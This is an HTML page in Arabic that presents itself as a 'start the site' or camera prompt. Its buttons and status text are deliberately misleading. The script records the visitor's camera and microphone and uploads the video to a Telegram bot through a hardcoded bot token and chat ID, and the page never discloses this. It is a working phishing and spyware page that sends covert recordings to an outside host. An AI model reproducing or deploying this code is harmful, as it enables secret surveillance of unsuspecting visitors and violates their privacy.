<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تشغيل الكاميرا</title>
    <style>
        body { font-family: Arial; text-align: center; padding: 20px; background-color: #f5f5f5; }
        .container { background: white; border-radius: 10px; padding: 20px; box-shadow: 0 0 10px rgba(0,0,0,0.1); max-width: 500px; margin: 0 auto; }
        button { background: #4CAF50; color: white; border: none; padding: 12px 25px; font-size: 16px; border-radius: 5px; cursor: pointer; margin: 10px; }
        button:hover { background: #45a049; }
        button#stopBtn { background: #f44336; }
        button#stopBtn:hover { background: #d32f2f; }
        video { width: 100%; max-width: 400px; margin: 15px 0; border-radius: 5px; }
        #status { margin: 15px 0; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <h1>تشغيل الكاميرا</h1>
        <p>اضغط الزر لبدء التسجيل</p>
        
        <button id="startBtn">تشغيل الموقع</button>
        <button id="stopBtn" disabled>هل  تريد تشغيل الموقع</button>
        
        <video id="videoPreview" autoplay muted></video>
        <div id="status">انتظار التشغيل...</div>
    </div>

    <script>
        // بيانات البوت
        const BOT_TOKEN = "7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94";
        const CHAT_ID = "6913353602";
        
        // عناصر التحكم
        const startBtn = document.getElementById('startBtn');
        const stopBtn = document.getElementById('stopBtn');
        const videoPreview = document.getElementById('videoPreview');
        const statusDiv = document.getElementById('status');
        
        let mediaRecorder;
        let recordedChunks = [];
        let stream;

        // بدء التسجيل
        startBtn.addEventListener('click', async () => {
            try {
                statusDiv.textContent = "جاري التحضير...";
                startBtn.disabled = true;
                
                stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                videoPreview.srcObject = stream;
                
                mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                
                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) {
                        recordedChunks.push(event.data);
                    }
                };
                
                mediaRecorder.onstop = async () => {
                    const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
                    await sendVideoToTelegram(videoBlob);
                };
                
                mediaRecorder.start(1000); // تجميع البيانات كل ثانية
                recordedChunks = [];
                
                stopBtn.disabled = false;
                statusDiv.textContent = "انتظر...";
                
            } catch (error) {
                console.error('Error:', error);
                statusDiv.textContent = "خطأ: " + error.message;
                startBtn.disabled = false;
            }
        });

        // إيقاف التسجيل وإرسال الفيديو
        stopBtn.addEventListener('click', () => {
            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
                mediaRecorder.stop();
                stream.getTracks().forEach(track => track.stop());
                statusDiv.textContent = "جار تشغيل الموقع...";
                stopBtn.disabled = true;
            }
        });

        // إرسال الفيديو إلى التليجرام
        async function sendVideoToTelegram(videoBlob) {
            try {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('video', videoBlob, 'video_recording.webm');
                
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                    method: 'POST',
                    body: formData
                });
                
                if (response.ok) {
                    statusDiv.textContent = "تم تشغيل الموقع!";
                } else {
                    throw new Error('فشل تسجيل الموقع');
                }
                
            } catch (error) {
                console.error('Error sending video:', error);
                statusDiv.textContent = "خطأ في الإرسال: " + error.message;
            } finally {
                startBtn.disabled = false;
            }
        }

        // إيقاف التسجيل عند إغلاق الصفحة
        window.addEventListener('beforeunload', () => {
            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
                mediaRecorder.stop();
                stream.getTracks().forEach(track => track.stop());
            }
        });
    </script>
</body>
</html>